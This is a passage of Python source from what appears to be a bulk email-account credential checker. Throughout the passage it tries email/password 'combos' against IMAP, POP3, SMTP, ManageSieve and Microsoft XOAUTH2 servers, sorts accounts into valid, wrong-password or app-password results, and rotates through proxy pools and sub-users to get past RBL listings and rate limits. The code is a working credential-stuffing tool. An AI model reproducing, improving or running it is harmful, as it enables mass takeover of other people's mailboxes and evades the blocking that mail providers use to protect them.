                    f"{[h for h in imap_hosts if h.lower() in _drop]}")
                imap_hosts = _kept

        _web = [h for h in imap_hosts if h.lower() in WEB_ONLY_HOSTS]
        if _web and len(_web) < len(imap_hosts):
            imap_hosts = [h for h in imap_hosts if h.lower() not in WEB_ONLY_HOSTS] + _web

        trace_logs.append(
            f"IMAP ladder after web-only drop: {imap_hosts} "
            f"(POP {pop_hosts} | SMTP {_smtp_hosts})")

        domain_local_hosts = {h for h in (imap_hosts + pop_hosts + _smtp_hosts)
                              if _is_local_host(h)}

        tried_hosts = set()
        # Hosts that already answered WRONG / NEED_APP_PASSWORD.  A verdict from
        # ONE host is PROVISIONAL until a second independent host agrees, a second
        # RUNG of the same host agrees, or nothing is left to dial.
        wrong_hosts = set()
        wrong_rungs = set()          # FIX P0-1: (server, proto, port)
        app_hosts = set()
        app_rungs = set()
        confirm_wrong = bool(CFG.get("CONFIRM_WRONG_ACROSS_HOSTS", True))

        trace_logs.append(
            f"Protocols selected -> {' + '.join(active_protocols())} "
            f"(SMTP/ManageSieve are CONFIRM-ONLY: a failure never lowers a verdict).")
        trace_logs.append(f"Host order -> IMAP {imap_hosts} | POP {pop_hosts} | SMTP {_smtp_hosts}")
        if proxy_pool and proxy_mode != "off":
            trace_logs.append(f"Proxy pool: {len(proxy_pool)} node(s) alive, "
                              f"{quarantine_size()} quarantined for 407.")
        trace_logs.append(
            f"Concurrency: host cap {CFG.get('HOST_CONCURRENCY')} · "
            f"per-IP cap {CFG.get('PROXY_IP_CONCURRENCY')} · "
            f"per-subuser cap {CFG.get('PROXY_SUBUSER_CONCURRENCY')} · "
            f"proxy cap {CFG.get('PROXY_CONCURRENCY')} · "
            f"same-host retries {same_host_retries} · max rotations {MAX_ROTATIONS} · "
            f"rotation {'RANDOM' if CFG.get('RANDOM_ROTATION', True) else 'round-robin'}")
        trace_logs.append(f"WRONG confirmation across hosts: "
                          f"{'ON' if confirm_wrong else 'OFF (one-rung)'}")

        resolvable = [h for h in (imap_hosts + pop_hosts + _smtp_hosts) if fast_fail_dns_check(h)]
        dns_ok = bool(resolvable)
        if dns_ok:
            trace_logs.append(f"Fast-fail DNS check OK: {len(resolvable)}/"
                              f"{len(imap_hosts) + len(pop_hosts) + len(_smtp_hosts)} "
                              f"hosts resolve locally")
        else:
            trace_logs.append("Fast-fail DNS check failed: no candidate host resolves locally")
            if not proxy_pool or proxy_mode == "off":
                return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs

        imap_set = set(imap_hosts)
        pop_only = [h for h in pop_hosts if h not in imap_set]
        pop_dup = [h for h in pop_hosts if h in imap_set]

        primary_plan = []
        if allow_imap and imap_hosts:
            primary_plan.append((RUNG_IMAP, imap_hosts[0], 993, "ssl"))
        if allow_pop:
            for _ph in pop_only:
                primary_plan.append((RUNG_POP, _ph, 995, "ssl"))
        if allow_imap:
            for _h in imap_hosts[1:]:
                primary_plan.append((RUNG_IMAP, _h, 993, "ssl"))
        if allow_smtp:
            for _sh in _smtp_hosts:
                for _sp, _sm in SMTP_RUNG_PORTS:
                    primary_plan.append((RUNG_SMTP, _sh, _sp, _sm))
        if allow_sieve and imap_hosts:
            primary_plan.append((RUNG_SIEVE, imap_hosts[0], SIEVE_PORT, "starttls"))

        fallback_plan = []
        if allow_pop:
            fallback_plan += [(RUNG_POP, h, 995, "ssl") for h in pop_dup]
        if try_starttls and allow_imap:
            fallback_plan += [(RUNG_IMAP, h, 143, "starttls") for h in imap_hosts]
            fallback_plan += [(RUNG_IMAP, h, 143, "plain") for h in imap_hosts[:2]]
        if try_starttls and allow_pop:
            for h in pop_hosts:
                fallback_plan += [(RUNG_POP, h, 110, "starttls")]
                fallback_plan += [(RUNG_POP, h, 110, "plain")]

        if not primary_plan:
            trace_logs.append("No candidate hosts for this domain under the selected protocols.")
            return None, FAILED, "no candidate hosts for the selected protocols", None, trace_logs

        rung_cost = max(RUNG_COST_MIN, min(configured_to, RUNG_COST_MAX))
        work_floor = (len(primary_plan) * rung_cost * WORK_FLOOR_FACTOR) + WORK_FLOOR_PAD
        budget = max(12.0, float(CFG.get("ACCOUNT_DEADLINE", DEADLINE_NORMAL)) * 0.95)
        # FIX SPEED-1: the floor exists so a slow ladder is not cut off mid-rung,
        # but it was applied UNCONDITIONALLY - so the Deadline slider could never
        # shorten an account, and a 45s deadline still ran a 63s account. The
        # floor may lift the budget, but only to 1.6x what was asked for.
        if work_floor > budget:
            _floor_used = min(work_floor, budget * 1.6)
            trace_logs.append(
                f"Budget floored to fit the work: {_floor_used:.0f}s "
                f"({len(primary_plan)} rung(s) x {rung_cost:.0f}s x {WORK_FLOOR_FACTOR} "
                f"+ {WORK_FLOOR_PAD:.0f}s, capped at 1.6x the {budget:.0f}s the Deadline "
                f"slider allows) instead of {budget:.0f}s.")
            budget = max(12.0, _floor_used)

        proxy_deadline = t_start + (budget * PROXY_TOTAL_FRAC)
        proxy_primary_deadline = t_start + (budget * PROXY_PRIMARY_FRAC)
        hard_deadline = t_start + budget
        direct_primary_deadline = t_start + (budget * DIRECT_PRIMARY_FRAC)
        trace_logs.append(
            f"Account window {budget:.0f}s -> proxy "
            f"{budget * PROXY_PRIMARY_FRAC:.0f}s-{budget * PROXY_TOTAL_FRAC:.0f}s / "
            f"direct {budget * DIRECT_PRIMARY_FRAC:.0f}s-{budget:.0f}s "
            f"(legacy 143/110 rungs hold a reserved tail slice of each phase).")

        def _is_timeout(err):
            s = str(err).lower()
            return "timed out" in s or "timeout" in s

        def _do_attempt_raw(proto, server, port, tls_mode, user, px_used, attempt_to):
            if proto == RUNG_IMAP:
                if tls_mode == "ssl":
                    imap_once(user, password, server, px_used, insecure=prefer_insecure,
                              port=port, attempt_timeout=attempt_to)
                elif tls_mode == "starttls":
                    imap_starttls_once(user, password, server, px_used,
                                       insecure=prefer_insecure, port=port,
                                       attempt_timeout=attempt_to)
                else:
                    imap_plain_once(user, password, server, px_used, port=port,
                                    attempt_timeout=attempt_to)
            elif proto == RUNG_POP:
                if tls_mode == "ssl":
                    pop_once(user, password, server, px_used, insecure=prefer_insecure,
                             port=port, attempt_timeout=attempt_to)
                elif tls_mode == "starttls":
                    pop_starttls_once(user, password, server, px_used,
                                      insecure=prefer_insecure, port=port,
                                      attempt_timeout=attempt_to)
                else:
                    pop_plain_once(user, password, server, px_used, port=port,
                                   attempt_timeout=attempt_to)
            elif proto == RUNG_SMTP:
                smtp_auth_once(user, password, server, px_used, insecure=prefer_insecure,
                               port=port, attempt_timeout=attempt_to)
            else:
                sieve_auth_once(user, password, server, px_used, insecure=prefer_insecure,
                                port=port, attempt_timeout=attempt_to)

        def do_attempt(proto, server, port, tls_mode, user, px_used, attempt_to, deadline_ts=None):
            """Serialised per destination host, per proxy IP, per sub-user, globally.

            v13.51: the gate OBJECTS are bound once and every release is guarded.
            Releasing through a fresh lookup and letting the release raise meant a
            rebuilt gate turned "released too many times" into the attempt's
            result and ate the real one.

            v13.52: attempt_to is clamped to the remaining window BEFORE the first
            gate is taken.  Each wait used to get the full _gate_wait(attempt_to)
            on its own, so three contended gates in sequence could spend more than
            the rung's whole slice before a single byte was dialled - which is what
            the "N rung(s) not attempted" lines were reporting.
            """
            if deadline_ts is not None:
                _rem = deadline_ts - time.time()
                attempt_to = max(2.5, min(attempt_to, _rem)) if _rem > 1.0 else 2.0
            if int(port) in LEGACY_PORTS:
                attempt_to = min(attempt_to, LEGACY_RUNG_TIMEOUT)
            gate = _host_gate(server)
            got_host = gate.acquire(timeout=max(2.0, attempt_to))
            try:
                if px_used:
                    pg = _proxy_gate()
                    got_proxy = pg.acquire(timeout=_gate_wait(attempt_to))
                    try:
                        _pxinfo = parse_proxy(px_used)
                        ipg = _ip_gate(_pxinfo["host"] if _pxinfo else None)
                        got_ip = ipg.acquire(timeout=_gate_wait(attempt_to))
                        try:
                            sg = _subuser_gate((_pxinfo.get("user") or "").lower() if _pxinfo else "")
                            got_sub = sg.acquire(timeout=_gate_wait(attempt_to))
                            try:
                                _do_attempt_raw(proto, server, port, tls_mode, user,
                                                px_used, attempt_to)
                            finally:
                                if got_sub:
                                    try:
                                        sg.release()
                                    except Exception:
                                        pass
                        finally:
                            if got_ip:
                                try:
                                    ipg.release()
                                except Exception:
                                    pass
                    finally:
                        if got_proxy:
                            try:
                                pg.release()
                            except Exception:
                                pass
                else:
                    _do_attempt_raw(proto, server, port, tls_mode, user, px_used, attempt_to)
            finally:
                if got_host:
                    try:
                        gate.release()
                    except Exception:
                        pass

        err_text = ""
        attempt_to_ref = [configured_to]
# @@END 100 CORE_SETUP

# @@BLOCK 101 CORE_VERDICT_HELPERS deps=022,023,067,100
        def try_ms_xoauth2(server, px_used, attempt_to, err_snapshot=""):
            nonlocal acct_407_total, err_text
            if not MS_OAUTH_OK:
                return None
            if server.lower() not in ms_oauth.MS_IMAP_HOSTS:
                return None
            if not ms_oauth.should_try_ms_xoauth2(server, err_snapshot or err_text, domain):
                return None
            try:
                exists, claims = ms_oauth.imap_xoauth2_once(
                    email, password, server, ProxyIMAP4SSL, port=993,
                    proxy_str=px_used, insecure=prefer_insecure,
                    attempt_timeout=attempt_to)
                who = claims.get("preferred_username") or email
                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 VALID on {server}:993 "
                                  f"(EXISTS={exists}, as={who}, exp={claims.get('exp')})")
                return (server, VALID,
                        f"{px_tag(px_used)} XOAUTH2 | Host: {server} | Port: 993 | "
                        f"real account password (basic auth disabled)",
                        px_used, trace_logs)
            except ms_oauth.MsTokenTransport as te:
                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 transport issue -> verdict "
                                  f"unchanged ({str(te)[:90]})")
                return None
            except ProxyAuthError as pae:
                err_text = str(pae)
                flags["saw_407"] = True
                record_proxy_attempt(px_used, success=False,
                                     is_network_error=True, is_proxy_auth=True)
                host_407[server] = host_407.get(server, 0) + 1
                acct_407_total += 1
                trace_logs.append(
                    f"{px_tag(px_used)} -> PROXY 407 (XOAUTH2) {server}:993: "
                    f"{err_text[:200]} [Classified: proxy_unhealthy]")
                return None
            except ms_oauth.MsTokenRejected as tr:
                if tr.verdict == "wrong_password":
                    # force=True: AADSTS50126 is definitive.  Without it the IMAP
                    # rung's APP (priority 1) suppressed this WRONG (priority 2).
                    note_verdict(WRONG, f"XOAUTH2 token {tr.code} -> wrong password",
                                 server, force=True)
                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected "
                                      f"[{tr.code}] -> wrong password (definitive)")
                elif tr.verdict == "need_app_password":
                    note_verdict(APP, f"XOAUTH2 token {tr.code} -> MFA, app password required",
                                 server, force=True)
                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected "
                                      f"[{tr.code}] -> MFA, app password required")
                else:
                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected "
                                      f"[{tr.code}] -> no verdict change")
                return None
            except Exception as xe:
                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 failed: {str(xe)[:90]}")
                return None

        def _rotate_to_fresh(px_used, seen_px, why, keep_node=False):
            """keep_node=True holds the node that just REACHED the mail server."""
            if keep_node:
                trace_logs.append(f"Keeping proxy ({why}) -> {px_tag(px_used)}")
                return px_used, False
            newpx = sample_alive_proxy(exclude=seen_px, avoid=seen_px, domain=domain)
            if newpx and newpx not in seen_px:
                seen_px.add(newpx)
                trace_logs.append(f"Rotating proxy ({why}) -> {px_tag(newpx)}")
                return newpx, True
            return px_used, False

        def _handle_app_or_wrong(st_val, proto, server, port, user, u_idx, px_used, seen_px,
                                 had_net, saw_retry):
            """Shared body for the APP / WRONG verdict handling.

            Returns (result_tuple_or_None, had_net, saw_retry, advance).
              * result is not None      -> RETURN it
              * advance is True         -> keep going (PROVISIONAL)
              * advance is "retry_user" -> retry this host as the LOCAL PART

            FIX P0-1 / P0-4: this helper previously carried a SECOND, unreachable
            copy of the WRONG block after the first `return`, and the confirmation
            gate counted only LOCAL hosts - while the current host was already in
            tried_hosts.  On any domain whose only local candidate was one
            imap.<domain> box the gate therefore confirmed on the FIRST rung and
            a valid combo was reported WRONG without POP3, the sibling hosts or
            143/110 ever being dialled.
            """
            if st_val == APP:
                xres = try_ms_xoauth2(server, px_used, attempt_to_ref[0], err_text)
                if xres:
                    return xres, had_net, saw_retry, False
                if u_idx + 1 < len(users):
                    flags["saw_server"] = True
                    px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry",
                                                    keep_node=True)
                    trace_logs.append(f"{px_tag(px_used)} App-password signal as '{user}' -> "
                                      f"retrying same host as local-part '{users[u_idx + 1]}'")
                    return None, had_net, saw_retry, "retry_user"
                app_hosts.add(server)
                app_rungs.add((server, proto, port))
                _untried_local = [h for h in domain_local_hosts if h not in tried_hosts]
                _conf_pool = [h for h in (imap_hosts + pop_hosts) if h not in tried_hosts]
                _rungs_left_here = [r for r in (fallback_plan or ())
                                    if r[1] == server
                                    and (r[1], r[0], r[2]) not in wrong_rungs
                                    and (r[1], r[0], r[2]) not in app_rungs]
                _confirmed = ((len(app_hosts) >= 2) or (len(app_rungs) >= 2)
                              or (not _conf_pool and not _rungs_left_here))
                if (not confirm_wrong) or _confirmed:
                    # A definitive XOAUTH2 WRONG outranks a basic-auth "app
                    # password" signal - return the stronger one.
                    if best_verdict["status"] == WRONG:
                        return (None, WRONG,
                                best_verdict["detail"] + _wrong_detail_note(domain, password),
                                px_used, trace_logs), had_net, saw_retry, False
                    return (None, APP, f"{px_tag(px_used)} {proto} {server} -> {st_val}",
                            px_used, trace_logs), had_net, saw_retry, False
                trace_logs.append(
                    f"{px_tag(px_used)} APP on {server} -> PROVISIONAL "
                    f"({len(app_hosts)} host(s) agreed, {len(_conf_pool)} candidate(s) "
                    f"still untried, {len(_untried_local)} local, "
                    f"{len(app_rungs)} rung(s) dialled) -> continuing")
                return None, had_net, saw_retry, True

            # ---- WRONG (single copy - the duplicate after the first return is gone) ----
            # The local-part retry runs FIRST: a legacy Zimbra / cPanel / Dovecot
            # front answers AUTHENTICATIONFAILED for 'user@domain' and accepts
            # 'user'.  It must also run BEFORE wrong_hosts.add(), because the host
            # has not been authoritatively tested until every username candidate is
            # exhausted - otherwise one host can satisfy the confirmation gate on a
            # username it was always going to reject.
            if u_idx + 1 < len(users):
                flags["saw_server"] = True
                px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry",
                                                keep_node=True)
                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> retrying same "
                                  f"host as local-part '{users[u_idx + 1]}'")
                return None, had_net, saw_retry, "retry_user"

            wrong_hosts.add(server)
            wrong_rungs.add((server, proto, port))
            _untried_local = [h for h in domain_local_hosts if h not in tried_hosts]
            _conf_pool = [h for h in (imap_hosts + pop_hosts) if h not in tried_hosts]
            # FIX P0-1b: this host's still-undialled 143/110 rungs count as
            # "something left to dial". Without this, a single-IMAP-host domain
            # confirmed on rung 1 and skipped the whole fallback plan + direct sweep.
            _rungs_left_here = [r for r in (fallback_plan or ())
                                if r[1] == server
                                and (r[1], r[0], r[2]) not in wrong_rungs
                                and (r[1], r[0], r[2]) not in app_rungs]
            # Only LOCAL hosts count toward confirmation. A foreign/public host
            # (imap.gmail.com for a non-Gmail domain) must not make the account WRONG.
            _local_wrong = [h for h in wrong_hosts if _is_local_host(h)]
            _local_wrong_rungs = [r for r in wrong_rungs if _is_local_host(r[0])]
            _confirmed = ((len(_local_wrong) >= 2) or (len(_local_wrong_rungs) >= 2)
                          or (not _conf_pool and not _rungs_left_here))

            if (not confirm_wrong) or _confirmed:
                return (None, WRONG,
                        f"{px_tag(px_used)} {proto} {server} -> {st_val}"
                        + _wrong_detail_note(domain, password),
                        px_used, trace_logs), had_net, saw_retry, False

            trace_logs.append(
                f"{px_tag(px_used)} WRONG on {server} -> PROVISIONAL "
                f"({len(wrong_hosts)} host(s) agreed, {len(_conf_pool)} candidate(s) "
                f"still untried, {len(_untried_local)} local, "
                f"{len(wrong_rungs)} rung(s) dialled) -> continuing the ladder")
            return None, had_net, saw_retry, True
# @@END 101 CORE_VERDICT_HELPERS

# @@BLOCK 102 CORE_SWEEP deps=016,022,100,101
        def sweep(px_used, rungs, deadline_ts, label, allow_rotate=True):
            nonlocal acct_407_total, err_text
            had_net = False
            saw_retry = False
            if not rungs:
                return None, had_net, saw_retry

            left = deadline_ts - time.time()
            if left <= 1.5:
                # v13.60: a deadline already in the past printed a NEGATIVE
                # window ("no window left (-4.0s)"), which reads like the clock
                # went backwards. Clamped at zero; `left` itself is left alone
                # because the per-rung share below is computed from it.
                trace_logs.append(f"{label}: no window left ({max(0.0, left):.1f}s).")
                return None, had_net, saw_retry

            per_to = max(3.0, min(configured_to, left / max(1, len(rungs))))
            trace_logs.append(f"--- {label}: {len(rungs)} rung(s), ~{per_to:.1f}s each, "
                              f"{left:.1f}s window ---")

            for rung_idx, (proto, server, port, tls_mode) in enumerate(rungs):
                if time.time() > deadline_ts:
                    trace_logs.append(f"{label}: window reached; stopping this pass "
                                      f"({len(rungs) - rung_idx} rung(s) not attempted).")
                    break

                tried_hosts.add(server)

                if px_used and proxy_mode != "off" and proxy_is_quarantined(px_used):
                    _fresh = sample_alive_proxy(domain=domain, avoid=used_proxies)
                    if _fresh and _fresh != px_used:
                        px_used = _fresh
                        used_proxies.add(_fresh)
                        trace_logs.append(f"Quarantined node in hand -> switched to fresh "
                                          f"node {px_tag(px_used)}")

                rotations_left = MAX_ROTATIONS if (allow_rotate and px_used
                                                   and proxy_mode != "off") else 0
                seen_px = used_proxies
                acct_407 = 0

                while True:
                    if time.time() > deadline_ts:
                        break

                    _rem = deadline_ts - time.time()
                    if _rem <= 1.0:
                        break
                    attempt_to = max(2.5, min(per_to, _rem))
                    attempt_to_ref[0] = attempt_to

                    trace_logs.append(f"{px_tag(px_used)} Attempting {proto} "
                                      f"{tls_mode.upper()} -> Host: {server}:{port}")
                    server_level_fail = False
                    rotate_now = False
                    retry_same = False
                    retry_same_node = False
                    proxy_dead = False
                    tls_refused = False
                    err_text = ""

                    for u_idx, user in enumerate(users):
                        try:
                            do_attempt(proto, server, port, tls_mode, user, px_used,
                                       attempt_to, deadline_ts)
                            record_proxy_attempt(px_used, success=True)
                            note_verdict(VALID, f"{proto} {server}:{port}", server)
                            note = "" if user == primary_user else f" | User: {user} (local-part)"
                            trace_logs.append(f"{px_tag(px_used)} Post-auth {proto} "
                                              f"verification OK on {server}:{port}{note}")
                            return (server, VALID,
                                    f"{px_tag(px_used)} {proto} | Host: {server} | "
                                    f"Port: {port}{note}",
                                    px_used, trace_logs), had_net, saw_retry

                        except ProxyAuthError as pae:
                            err_text = str(pae)
                            flags["saw_407"] = True
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=True, is_proxy_auth=True)
                            host_407[server] = host_407.get(server, 0) + 1
                            acct_407 += 1
                            acct_407_total += 1
                            trace_logs.append(
                                f"{px_tag(px_used)} -> PROXY 407 {proto} {server}:{port}: "
                                f"{err_text[:200]} [Classified: proxy_unhealthy]")
                            proxy_dead = True
                            rotate_now = True
                            # A 407 is a proxy answer, not a username answer: break
                            # the username loop so the retry below is not preceded
                            # by a second dial through the same dead node.
                            server_level_fail = True
                            _su = _subuser_of(px_used)
                            if px_used and _su and _su not in retried_407_subusers:
                                retried_407_subusers.add(_su)
                                retry_same_node = True
                                proxy_dead = False
                                rotate_now = False

                        except ProxyPlanError as pln:
                            # FIX PLAN-1: 402 is the provider refusing SERVICE on a
                            # node that is alive and authenticated. It is not the
                            # node, not the password, and not a network fault.
                            #
                            # v13.54: IT ALSO SETS saw_plan. Nothing else here was
                            # set by a 402, so a wholly 402 proxy phase looked like a
                            # clean run with no answer: block 103's direct_reason
                            # stayed false, the DIRECT sweep was skipped, and the
                            # account fell through to the generic tail as FAILED.
                            #
                            # v13.64: IT NOW ROTATES INSTEAD OF ADVANCING. The node
                            # is parked for PROXY_PLAN_PARK by record_proxy_attempt,
                            # but advancing the rung with the SAME spent node was
                            # still wrong: the CONNECT never gets through, so every
                            # later rung on that node is guaranteed to answer 402 too
                            # and the whole ladder was burned on one spent sub-user.
                            # A 402 is per SUB-USER, not per provider - another node
                            # is very often on a sub-user that still has bandwidth,
                            # so the rotation is a real chance at a real answer.
                            # It costs nothing when the whole plan is spent: the
                            # rotation simply fails and the rung advances as before.
                            err_text = str(pln)
                            flags["saw_nonproxy"] = True
                            flags["saw_plan"] = True
                            record_proxy_attempt(px_used, success=False, is_plan=True)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> PROVIDER REFUSING SERVICE {proto} "
                                f"{server}:{port}: {err_text[:140]} "
                                f"[402 plan/bandwidth - node parked "
                                f"{PROXY_PLAN_PARK:.0f}s, rotating]")
                            server_level_fail = True
                            rotate_now = True

                        except ProxyPortBlocked as pblk:
                            # FIX 407-SCOPE: 403 means the provider refuses this
                            # DESTINATION PORT by policy. The credential is proven
                            # and the node is alive, so the node is credited a
                            # success and the ladder advances WITHOUT rotating -
                            # another node cannot fix a blocked port either.
                            #
                            # FIX PORT-1 (v13.57): IT USED TO SET saw_server, and that
                            # one flag made block 104's generic tail report "mail host
                            # reached but the server dropped LOGIN" on a pool that had
                            # 403'd every rung - the CONNECT never got to the mail host
                            # at all. saw_server is now left alone; saw_port_block is
                            # its own flag, and had_net / net_failed_hosts are set so
                            # block 103's direct_reason sees a reason to run DIRECT.
                            err_text = str(pblk)
                            flags["saw_nonproxy"] = True
                            flags["saw_port_block"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=True)
                            _perm = int(port) in PROVIDER_BLOCKED_PORTS
                            trace_logs.append(
                                f"{px_tag(px_used)} -> PORT BLOCKED {proto} {server}:{port}: "
                                f"{err_text[:160]} [provider refuses this destination port - "
                                f"advancing, node credited"
                                + (", permanently blocked on the plan" if _perm else "")
                                + "]")
                            server_level_fail = True
                            rotate_now = False

                        except ProxyTransportError as pte:
                            err_text = str(pte)
                            flags["saw_nonproxy"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=True, is_proxy_auth=False)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> PROXY TRANSPORT {proto} {server}:{port}: "
                                f"{err_text[:200]} [Classified: {FAILED}]")
                            server_level_fail = True
                            rotate_now = True

                        except (SmtpAuthError, SieveAuthError) as cnf:
                            err_text = str(cnf)
                            flags["saw_nonproxy"] = True
                            flags["saw_server"] = True
                            flags["saw_auth"] = True
                            record_proxy_attempt(px_used, success=False, is_network_error=False)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> CONFIRM {proto} {server}:{port}: "
                                f"{err_text[:140]} [Classified: {WRONG} - confirm-only]")
                            note_verdict(WRONG, f"{proto} {server}:{port} -> {WRONG} "
                                                 f"(confirm-only)", server)
                            if u_idx + 1 < len(users):
                                continue
                            server_level_fail = True
                            rotate_now = False

                        except (SmtpSoftError, SieveSoftError) as soft:
                            err_text = str(soft)
                            flags["saw_nonproxy"] = True
                            flags["saw_server"] = True
                            record_proxy_attempt(px_used, success=False, is_network_error=False)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> INCONCLUSIVE {proto} {server}:{port}: "
                                f"{err_text[:140]} [no verdict change]")
                            server_level_fail = True
                            rotate_now = False

                        except ssl.SSLError as ssl_err:
                            err_text = str(ssl_err)
                            st_val = classify_error(ssl_err, domain)
                            tls_refused = _is_tls_refused(err_text)
                            flags["saw_nonproxy"] = True
                            flags["saw_server"] = True
                            if tls_refused:
                                flags["saw_tls_refused"] = True
                            if st_val == CONNECTION_FAILED:
                                had_net = True
                                net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=(st_val == CONNECTION_FAILED))
                            trace_logs.append(f"{px_tag(px_used)} -> TLS FAILED {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {st_val}]")
                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)
                            server_level_fail = True
                            rotate_now = (_is_proxy_level_error(err_text)
                                          or (st_val == CONNECTION_FAILED and not tls_refused))

                        except (socket.timeout, TimeoutError) as to_err:
                            err_text = str(to_err)
                            flags["saw_nonproxy"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False, is_network_error=True)
                            trace_logs.append(f"{px_tag(px_used)} -> TIMEOUT {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {FAILED}]")
                            server_level_fail = True

                            _kind = _timeout_kind(to_err)
                            if _kind == "connect":
                                if px_used and proxy_mode != "off" and not conn_rotated.get(server):
                                    conn_rotated[server] = True
                                    rotate_now = True
                                    trace_logs.append(f"{px_tag(px_used)} Connect-level timeout "
                                                      f"-> rotating node ONCE, no in-place retry")
                                else:
                                    rotate_now = False
                                    trace_logs.append(f"{px_tag(px_used)} Connect-level timeout "
                                                      f"-> advancing past {server}:{port} "
                                                      f"(no in-place retry)")
                            else:
                                rotate_now = True
                                if (retries_by_host.get(server, 0) < same_host_retries
                                        and (deadline_ts - time.time()) > 7.0):
                                    retries_by_host[server] = retries_by_host.get(server, 0) + 1
                                    retry_same = True

                        except (socket.error, ConnectionRefusedError) as sock_err:
                            err_text = str(sock_err)
                            flags["saw_nonproxy"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False, is_network_error=True)
                            trace_logs.append(f"{px_tag(px_used)} -> SOCKET FAILED {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {FAILED}]")
                            server_level_fail = True
                            rotate_now = True

                        except (imaplib.IMAP4.error, poplib.error_proto) as proto_err:
                            err_text = str(proto_err)
                            st_val = classify_error(proto_err, domain)
                            # v13.51: "TLS not supported by server" is raised by
                            # starttls() BEFORE any LOGIN is sent.  It was filed
                            # as saw_server, so the tail claimed the server had
                            # accepted LOGIN and dropped it.  It did not.
                            tls_refused = _is_tls_refused(err_text)
                            flags["saw_nonproxy"] = True
                            if tls_refused:
                                flags["saw_tls_refused"] = True
                            else:
                                flags["saw_server"] = True
                            if st_val in (APP, WRONG, RBL, RETRY, LOGIN_DROPPED):
                                flags["saw_auth"] = True
                            record_proxy_attempt(px_used, success=False, is_network_error=False)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> AUTH {proto} "
                                f"{server}:{port}: {err_text[:140]} "
                                f"[Classified: {st_val}]"
                                + (" [TLS/STARTTLS refused - no LOGIN issued]"
                                   if tls_refused else ""))
                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)

                            if st_val == LOGIN_DROPPED:
                                flags["saw_login_drop"] = True
                                trace_logs.append(
                                    f"{px_tag(px_used)} Server ANSWERED then closed the socket "
                                    f"(* BYE) on {proto} {server}:{port} -> server-side, "
                                    f"password still untested; continuing the ladder")

                            if st_val in (APP, WRONG):
                                res, had_net, saw_retry, act = _handle_app_or_wrong(
                                    st_val, proto, server, port, user, u_idx, px_used, seen_px,
                                    had_net, saw_retry)
                                if res is not None:
                                    return res, had_net, saw_retry
                                if act == "retry_user":
                                    continue
                                server_level_fail = True
                                rotate_now = False
                            elif st_val == RETRY:
                                saw_retry = True
                                server_level_fail = True
                                if "lookup failed" in err_text.lower():
                                    rotate_now = False
                                    trace_logs.append(f"{px_tag(px_used)} 'Lookup failed' on "
                                                      f"{server}:{port} -> advancing to next "
                                                      f"host (no proxy rotation)")
                                else:
                                    rotate_now = True
                            elif st_val == RBL:
                                trace_logs.append(f"{px_tag(px_used)} RBL block on "
                                                  f"{server}:{port} -> IP flagged by server, "
                                                  f"advancing")
                                server_level_fail = True
                            elif u_idx + 1 < len(users) and st_val in (UNKNOWN, LOGIN_DROPPED):
                                flags["saw_server"] = True
                                px_used, _ok = _rotate_to_fresh(px_used, seen_px,
                                                                "local-part retry", keep_node=True)
                                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> "
                                                  f"retrying same host as local-part "
                                                  f"'{users[u_idx + 1]}'")
                                continue
                            elif st_val == LOGIN_DROPPED:
                                server_level_fail = True
                                rotate_now = False
                                trace_logs.append(
                                    f"{px_tag(px_used)} LOGIN_DROPPED on {server}:{port} -> "
                                    f"advancing the ladder (POP3 / other hosts still get a turn)")
                            else:
                                server_level_fail = True
                                # v13.51: a refused STARTTLS answers identically on
                                # every retry, so it does not earn one.
                                if (st_val == CONNECTION_FAILED and not tls_refused
                                        and retries_by_host.get(server, 0) < same_host_retries
                                        and (deadline_ts - time.time()) > 7.0):
                                    retries_by_host[server] = retries_by_host.get(server, 0) + 1
                                    retry_same = True

                        except Exception as e:
                            err_text = str(e)
                            st_val = classify_error(e, domain)
                            proxy_level = _is_proxy_level_error(err_text)
                            tls_refused = _is_tls_refused(err_text)
                            if proxy_level:
                                flags["saw_407"] = True
                                record_proxy_attempt(px_used, success=False,
                                                     is_network_error=True, is_proxy_auth=True)
                                host_407[server] = host_407.get(server, 0) + 1
                                acct_407 += 1
                                acct_407_total += 1
                            else:
                                flags["saw_nonproxy"] = True
                                if tls_refused:
                                    flags["saw_tls_refused"] = True
                                if "Fast-fail DNS check" not in err_text and not tls_refused:
                                    flags["saw_server"] = True
                            if st_val in (APP, WRONG, RBL, RETRY, LOGIN_DROPPED):
                                flags["saw_auth"] = True
                            if _is_timeout(e):
                                had_net = True
                                net_failed_hosts.add(server)
                            if st_val == CONNECTION_FAILED:
                                had_net = True
                                net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=(st_val == CONNECTION_FAILED))
                            trace_logs.append(f"{px_tag(px_used)} -> FAILED {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {st_val}]")
